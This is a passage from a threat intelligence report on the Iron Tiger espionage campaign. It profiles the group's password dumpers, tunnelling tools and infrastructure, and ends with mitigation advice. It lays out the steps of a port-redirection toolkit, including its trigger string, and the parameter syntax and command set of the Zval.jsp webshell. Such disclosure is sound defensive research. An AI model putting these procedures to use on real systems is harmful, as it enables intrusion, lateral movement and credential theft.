One  version  (SHA-1: \n\n75f098d6b3f217aba4c068b12896c332216fc6b3)  used  in  Iron  Tiger  employed  a  legitimate  Kaspersky \n\nbinary named \u201csetup.exe\u201d to infect systems with a malicious DLL.

This was hosted in \n\nHong  Kong  at  the  time  this  paper  was  written.  It  creates  a  unique  GUID  that  is  stored  in  config.ini\t on \n\ninfected systems.

It \n\ncould have been created for the exclusive use in targeted attacks.\n\nOld unpatched servers that can be found online are easy prey \nto any attacker.\n\nFile certificate abusers\n\nIron Tiger uses three tools signed with the certificates on the next page.\n\n39 | Operation Iron Tiger\n\n\fIron Tiger uses this certificate signed on 22 \n\nCertificate\u2019s validity information\n\nNovember 2012\n\nThe certificate with serial number, 23 92 b8 b2 e1 d5 e9 27 c7 26 37 9b 45 d2 21 ce, valid from 15 September \n\n2012 to 15 November 2014, was issued by Korea-based company, SoftCamp. It was signed on 22 November \n\n2012 and has been used for the Netcat (nc) binary, HTran\u2019s packed version, and a GSecDump binary.\n\nIt is not clear why the actors decided to sign files but not the malware at the same time and in the same way. \n\nWe have not seen any of the other file certificates they used. This could be because they did not need them \n\nand  found  that  their  tools  and  malware  were  enough  to  stealthily  move  inside  target  networks.  Adding \n\nthe legitimate file certificate to their arsenal made it easier for the attackers to laterally move throughout \n\nnetworks and collect user credentials without getting noticed. Signed binaries are not often monitored by \n\nsecurity solutions.\n\nMore Iron Tiger tools\n\nAspxSpy2014\n\nAspxSpy  is  a  publicly  available  WebShell.

Finally,  activedsimp.dll  is  an  Active \n\nDirectory service AspxSpy plug-in.\n\nMimikatz, ZhuMimikatz, and Invoke-Mimikatz\n\nWe  found  several  variants  of  the  Mimikatz  password  dumper.  While  some  were  common  versions \n\n(SHA-1:  3d3db9d8da0eba33444c73b6f85a4fd98a685055),  others  were  not  like  ZhuMimikatz  (SHA-\n\n1:  4883376735f981386e473318482fadfe90edc670)  and  two  Mimikatz  PowerShell  versions  (SHA-1: \n\n14a4b7cd0215a3d512f97d6ec4072a784f123527  and  ab68576e3cf6bf8020cf15a83390ebf9d545389b). \n\nThese allowed Mimikatz to completely work in memory without leaving traces on the file system.\n\nGSecDump\n\nGSecDump is a free publicly available password dumper. It has been used for years by various threat actors \n\nand legitimate security auditors alike. Nearly all threat actors slightly modified the GSecDump binary to \n\nevade antivirus detection. All versions found are, in fact, detected on VirusTotal.\n\nQuarksPwDump\n\nPassword dumper, QuarksPwDump or hashdump.exe (SHA-1: 3c6becafa9594601db64dc32c2c0384425a8fb5c, \n\ndetected by Trend Micro as HKTL_PWDump), along with its source code, are also publicly available for \n\nfree on https://github.com/quarkslab/quarkspwdump. The actors, however, compiled their own version \n\nin June 2012, a month after the release of the original code. This showed that they closely monitored such \n\nsecurity tool updates.\n\n41 | Operation Iron Tiger\n\n\fGetPassword_x64\n\nGetPassword_x64 \n\n(SHA-1: \n\n71c11988a7a14e2257a91bcc5efa85520540aa5c, \n\ndetected by Trend Micro as HKTL_PWDump) is a \n\npassword dumper specifically for 64-bit systems. \n\nIt is also publicly available. It has the debug string, \n\n\u201cC:\\Users\\K8team\\Desktop\\GetPassword\\\n\nDebug x64\\GetPassword.pdb,\u201d in its binary that \n\npoints to its developer, K8Team.\n\nReadPWD86\n\nSample output of GetPassword_x64.exe\n\nReadPWD86 \n\nis  another  publicly  available  password  dumper \n\nfor  x86 \n\nsystems \n\n(SHA-1: \n\n65b77d8b1ffd63a343c28e978487bc38b9792c6f, detected by Trend Micro as HKTL_PWDump).\n\nEFH3/1F\n\nEFH3/1F  is  a  command-line  tool  that  encodes \n\nfiles. It has a pretty straightforward purpose.\n\nEFH3/1F\u2019s output\n\nNBTScan\n\nNBTScan is a free publicly available tool that scans for open NETBIOS name servers on a local or remote \n\nTCP/IP network. Its functionality is based on that of standard Windows tool, nbtstat, though it operates on \n\nseveral addresses instead of just one.\n\n42 | Operation Iron Tiger\n\n\fNBTScan\u2019s options\n\nNetcat\n\nNetcat or nc.exe is a popular tool among network administrators and security auditors. It is often referred \n\nto as the \u201cSwiss Army knife\u201d of network-related tools. It allows users to read and write data across TCP \n\nor UDP network connections. While it is a very simple tool, it can do a lot of things, including opening a \n\nport and listening for connections, executing remote shells, and others. The nc.exe binary is signed with a \n\nSoftCamp file certificate.\n\nNc.exe\u2019s options\n\n43 | Operation Iron Tiger\n\n\fHTran\n\nHTran is very popular among Chinese threat actors. It is a network communication bouncer that allows \n\nattackers to use compromised machines as pivot to access other unreachable systems, for one. We found a \n\npacked and slightly modified (SHA-1: 9484bb1b1c0e39355a66b20fc361846ce1f063e0,detected by Trend \n\nMicro as HKTL_HTRan) and an unpacked version (SHA-1: 0ad2796b1312af4db975a3978ede19e939e42846, \n\nalso HKTL_HTRan) of this tool used in attacks. Both were named \u201cwebsys.exe.\u201d The packed HTran version \n\nwas also signed with a SoftCamp file certificate.\n\nHTran command-line tool\n\nUnknown redirection toolkit\n\nThough we could not identify this toolkit\u2019s name, we found that it comprised netcat and two files\u2014drivers.\n\nexe  (SHA-1:  add6f880705b4aaf4b22b60dd67ca9034694550d,  detected  by  Trend  Micro  as  HKTL_\n\nPORTCON)  and  ChangePort.exe  (SHA-1:  a346588c70751815bbb4c0922ea2c5e1ab9953db,  also  HKTL_\n\nPORTCON). It is very rarely seen in targeted attack campaigns.\n\nAttackers who want to access RDP 3389 via port 80 on an IIS server configured to only leave port 80 open \n\ncan use this toolkit, among others. We saw attackers:\n\n\u2022  Execute drivers.exe on the IIS server, which installs a Network Driver Interface Specification (NDIS) \n\ndriver\n\n\u2022  Run ChangePort.exe to map any port to port 3389 on the IIS server\n\n\u2022  Execute nc.exe and access the target server via port 80\n\n\u2022  When a connection has been established, send the special string, \u201cSend chkroot2007,\u201d and disconnect\n\n\u2022  An RDP client can now be connected to a target system\u2019s port 80 while all network traffic is redirected \n\nto port 3389\n\nBecause the attackers identified themselves by sending the special string, only their traffic is redirected. \n\nEveryone else\u2019s will be unaffected and stay on port 80.\n\n44 | Operation Iron Tiger\n\n\fZval.jsp\n\nZval.jsp is not a standalone WebShell, it needs a client to run on compromised servers. All commands are passed \n\nwith the parameter, /[REDACTED].jsp?[Password]=[Command]&z1=[Argument]&z2=[Argument]. The \n\nfollowing commands can be used:\n\n\u2022  A  List drives\n\n\u2022 \n\nJ  Create directory\n\n\u2022  B  List files in target directory\n\n\u2022  K  Set last modified time for file\n\n\u2022  C  Read file (ASCII mode)\n\n\u2022  L  Download file from remote URL\n\n\u2022  D  Write file (ASCII mode)\n\n\u2022  M  Execute shell command\n\n\u2022  E  Delete file or directory\n\n\u2022  N  Get database information\n\n\u2022  F  Download file (Binary mode)\n\n\u2022  O  List tables for specific database\n\n\u2022  G  Upload file (Hex to Binary mode)\n\n\u2022  P  List columns for specific table\n\n\u2022  H  Copy file or directory\n\n\u2022  Q  Execute SQL command\n\n\u2022 \n\nI  Rename file\n\nThis WebShell works with China Chopper.\n\nHTTP/SOCKS Proxy\n\nWe also found a tool called \u201cso.exe\u201d (SHA-1: 3ea58b2ff30ee1053a4053c681042516cb57038e, detected by \n\nTrend Micro as HKTL_Proxy). It is a very basic HTTP/SOCKS proxy, which is a slightly modified version \n\nof the publicly available SOCKS v4 && v5 && Http Proxy V2.0 by LZX.\n\nOther tools\n\nIn addition to the above-mentioned tools, the actors also use legitimate tools, including:\n\n\u2022\t Local.exe from Microsoft\u2019s Resource Kit, which enumerates the members of local groups on remote \n\nservers or domains\n\n\u2022  Microsft\u2019s PsGetSid.exe, which allows users to translate SIDs into display names and vice versa\n\n\u2022 \n\nJoeware.net\u2019s GetUserinfo\n\nWe  also \n\nfound  old  exploits \n\n(CVE-2008-1436) \n\nfor \n\nIIS  6  named \n\n\u201chelloa.exe\u201d \n\n(SHA-1: \n\n126a5972a0f6b0a5b0a2b52d7d848e8a9824f562,  detected  by  Trend  Micro  as  HKTL_IISExploit)  and \n\n\u201c6.exe\u201d (SHA-1: 856c3252fbc3d0e17d7d65cddff1ebbbab48496d, also HKTL_IISExploit).\n\n45 | Operation Iron Tiger\n\n\fInfrastructure\n\nIron  Tiger\u2019s  C&C  infrastructure  included  several  compromised  servers  and  the  extensive  use  of  BAIGE \n\nVPN\u2019s services.\n\nCompromised C&C servers\n\nIron Tiger successfully compromised an Asian academic institution\u2019s server to act as C&C server and stolen \n\ndata drop zone for dnstunclient. It was also accessed by a PlugX variant through a subdomain of shangxian.\n\ninfo. We decided not to disclose this subdomain though since it can reveal the academic institution\u2019s name.\n\nThis server was poorly configured. It was also used by warez distributors, in addition to the actors. The \n\nwarez  distributors  used  it  to  store  videos  for  virtually  anyone  on  the  Internet.  FTP  access  to  it  did  not \n\nrequire authentication. As such, anyone can use its various folders. One user even created a folder with a \n\nfunny name just to show how poorly secured the server was.\n\nData collected from C&C servers\n\nWe were able to gather a lot of information from Iron Tiger\u2019s main C&C server\u2014the academic institution\u2019s \n\ncompromised server.\n\nNetwork connections made to C&C servers\n\nSeveral network connections made via RDP were seen. This is not surprising, as the protocol is used to \n\naccess remote computers from different geographical locations. The actors accessed the C&C server using \n\nvarious IP addresses.\n\nIP address\n\nComputer name\n\nLocation\n\n114.88.206.132\n\n211.62.158.22\n\n180.150.226.27\n\n67.198.244.74\n\n157.7.64.122\n\n157.7.64.122\n\n125.140.30.31\n\n203.232.186.35\n\nYOUSISTE\n\nYOUSISTE\n\nYOUSISTE\n\nYOUSISTE\n\nYOUSISTE\n\nXM-ATT\n\nYOUSISTE\n\nYOUSISTE\n\nChina\n\nKorea\n\nKorea\n\nUSA\n\nJapan\n\nJapan\n\nKorea\n\nKorea\n\nIP addresses that the actors use to access the C&C server\n\n46 | Operation Iron Tiger\n\n\fThe computer name, \u201cYOUSISTE,\u201d frequently accessed the server, though we did not find useful information \n\non it. Interestingly, two different computers used the same IP address to access the C&C server. An attacker \n\ncould have used two computers to access the server or several attackers could have used the same attack \n\ninfrastructure.\n\nWe believe the RDP connections were aided by VPN services and/or compromised computers, making the \n\nactors harder to track and find. A connection going to a Chinese IP address (116.233.12.114), which was \n\nused as a data-exfiltration channel, was also seen.\n\nAttackers\u2019 local account\n\nA single user account named \u201cxss\u201d was created on the C&C server (compromised Windows Server\u00ae 2003) \n\non 14 September 2014. It used the password, \u201cwoshinidie,\u201d which translates to \u201cI am your father\u201d in Pinyin. \n\nPinyin is the official phonetic system for transcribing Mandarin pronunciations of Chinese characters into \n\nthe Latin alphabet. This password could be a funny reference to \u201cStar Wars.\u201d\n\nThe letters, \u201cxss,\u201d also seen in the Blogspot page (xssok), were again seen in reference to the C&C server.\n\nThe xss user account  was used in the last  quarter of 2014. It has not been used since. Instead, the real \n\nadministrator account was used.\n\nAdditional email accounts\n\nApart from the account used in spear-phishing campaigns, we saw the actors use additional email accounts \n\nfor  various  purposes.  They  had  several  email  accounts,  mostly  for  testing  purposes,  with  \u201cphpxss\u201d  or \n\n\u201ctestxss\u201d from providers like Gmail\u2122, Hotmail, AOL, and Yahoo!\u00ae.\n\nThe actors could be reporting to a different email address per victim. They, for instance, sent a list of files \n\nfrom a compromised system to a specific email address, which indicated the progress made. It is not clear, \n\nhowever, if the receiver was a member of the group or a third party that provided expert services to let \n\nattackers know which files were worth stealing.\n\nExtensive use of BAIGE VPN\u2019s services\n\nPhpxss extensively used BAIGE VPN\u2019s servers, which were mostly located in China (a little more than 500 \n\ndifferent IP addresses). Some servers were located in the US, Canada, Hong Kong, Russia, Taiwan, Japan, \n\nand South Korea.\n\n47 | Operation Iron Tiger\n\n\fChina\n\nUnited States\n\nTaiwan\n\nHong Kong\n\nJapan\n\nKorea\n\nRussia\n\nCanada\n\n94.45%\n\n1.97%\n\n0.89%\n\n0.72%\n\n0.72%\n\n0.72%\n\n0.36%\n\n0.17%\n\nCountries where BAIGE VPN servers were located\n\nBAIGE VPN offers very affordable services. Its most expensive offering was a one-year subscription worth \n\n130 Yuan (around \u20ac19). Its Windows client is pretty straightforward.\n\nBAIGE VPN\u2019s service prices\n\n48 | Operation Iron Tiger\n\n\fBAIGE VPN\u2019s client GUI\n\nWhile  phpxss  appears  to  use  this  service,  it  may  not  be  the  only  one.  To  ensure  anonymity,  attackers \n\nnormally hid behind several layers or VPNs or proxies.\n\nBAIGE VPN does not accept customers outside China. It \nimmediately filters out external connections via a registration \npage.\n\nDomain registration\n\nIron  Tiger  used  several  legitimate  online  services  for  its  infrastructure  but  also  employed  registered \n\ndomains.\n\nShangxian.info\n\nOne  of  shangxian.info\u2019s  subdomains  was  configured  to  point  to  the  main  C&C  server\u2019s  IP  address.  The \n\ndomain was registered by phpxss.\n\nInterestingly, one user named \u201cmyershao\u201d uses the exact same password as phpxss to create a local account \n\non a compromised machine. A familiar email address, [REDACTED]o @ live . cn, was also seen.\n\n49 | Operation Iron Tiger\n\n\fPi.mai1.info\n\nPi.mai1.info was used in relation to two malware families at the same time\u2014Gh0st and PlugX. These served \n\nas file attachments in a spear-phishing campaign.\n\nIn  one  campaign,  a \n\n.RAR  file  named  \u201cdocumentation.rar\u201d  contained  a  dropper  (SHA-1: \n\n3bcd90785ff5883bc460a74eca3bf9033a542335)  of  a  Gh0st  variant  named  \u201cNWCWorkstationex.dll\u201d \n\n(SHA-1:  96d6a67227a6d650ab8c5465cb4b091217e75a5f).  NWCWorkstationex.dll  could  be  an  early \n\nversion of Ring RAT configured to steal .DOC, .TXT, and .PPT files.\n\nTarget file types hard-coded in the NWCWorkstationex.dll binary\n\nAnother archive seen contained a dropper (SHA-1: 11348a72a0864c6c455a535d5d7bde2997270266) of a \n\nPoison  Ivy  variant  (SHA-1:  6bcd525bb425dbb7fbc79dd6a605fac8f925b0cb)  named  \u201cmspmsnsv.dll.\u201d  Its \n\nconfiguration leaked the nickname, \u201c2shao,\u201d which we were not able to tie to a real person\u2019s identity or \n\nprofile.\n\nMai1.info\u2019s registration information has changed several times. It showed references to supposed identities \n\nin Russia or the US at the time it was being actively used by malware. It had matching elements tied to \n\n[REDACTED]o @ live . cn and Guo Fei.\n\nRegistrant Name: Guo Fei [REDACTED] \n\nRegistrant Organization: \n\nRegistrant Street1: He Nan Sheng Huo Jia Xian \n\nRegistrant Street2: \n\nRegistrant Street3: \n\nRegistrant City: XinXiang \n\nRegistrant State/Province: HeNan \n\nRegistrant Postal Code: 0373 \n\nRegistrant Country: CN \n\nRegistrant Phone: +86.[REDACTED]39262 \n\nRegistrant Email: [REDACTED]o @ live . cn\n\nMai1.info\u2019s registration information\n\n50 | Operation Iron Tiger\n\n\fMitigation: Combating cyber espionage and \ntargeted attacks\n\nForeign spies in espionage films help their nations obtain competitive advantages over others by jumping \n\nseemingly impossible hoops and hurdles. These days, spying happens in cyberspace where threat actors \n\nare aided by either ready-made or customized tools and social engineering lures.\n\nWe saw cyberspies with digital roots in China target high-technology organizations from the US, but not \n\nbefore  spending  years  extracting  information  from  targets  in  Asia-Pacific,  including  their  own  country. \n\nIron Tiger, which could be part of a larger campaign where actors are assigned specific targets to monitor, \n\nparticularly trailed its sights on obtaining defense-related information. It is believed to have stolen up to \n\nterabytes of data, given that an organization lost 58GB alone.\n\nTargets face serious repercussions, given the sensitive nature of the data they keep. The data the actors \n\nstole,  after  all,  translates  to  years  of  invaluable  government  and  corporate  research  and  development \n\n(R&D) dollars.\n\nFor nation-states like the US and China, cyber espionage may not come as a surprise. Several campaigns \n\nlike Pawn Storm and Arid Viper have already taken advantage of the weakest links across industries to gain \n\ncounterintelligence or perform industrial espionage on perceived foes.\n\nQuestions with regard to threat mitigation remain. Thwarting cyber attacks should not rely on off-the-shelf, \n\ntraditional anti-malware solutions alone. Sensitive data requires custom defense and multilayer protection \n\nthat  can\u2019t  be  easily  rendered  useless  by  spear-phishing  campaigns  and  malware  attacks.  Organizations \n\nneed to gather threat intelligence to combat cyber espionage and protect against targeted attacks. They \n\nshould operate under the assumption that their network has already been compromised.\n\n51 | Operation Iron Tiger\n\n\fReferences\n\n1.  CrowdStrike.
